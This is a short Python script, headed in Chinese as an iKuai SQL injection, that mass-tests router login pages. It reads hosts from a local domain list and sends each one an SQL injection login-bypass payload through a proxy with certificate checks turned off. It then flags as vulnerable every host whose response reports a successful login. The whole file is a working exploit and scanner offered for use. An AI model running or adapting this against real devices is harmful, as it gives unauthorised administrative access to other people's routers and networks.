# ikuai sql注入

import json
import requests
import urllib3
urllib3.disable_warnings()
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept-Language": "gzip, deflate"
}


post = r'user="or""=""or""="&pass='

proxies = {
  "http": "http://127.0.0.1:10811",
  "https": "https://127.0.0.1:10811",
}

with open("D:\\code\\python\\exp\\domain.txt") as f:

    for i in f.readlines():
        url = i.strip("\n") + "/login/x"
        try:
            requests.packages.urllib3.disable_warnings()
            re = requests.post(url, data=str(post), headers=headers, proxies=proxies, verify=False)
            if re.text == r'{"recode":0,"error":"\u767b\u5f55\u6210\u529f"}':
                print(re.text)
                print("[+]存在漏洞", url)
            else:
                print("[-]修复了")



        except requests.exceptions.ConnectionError:
            pass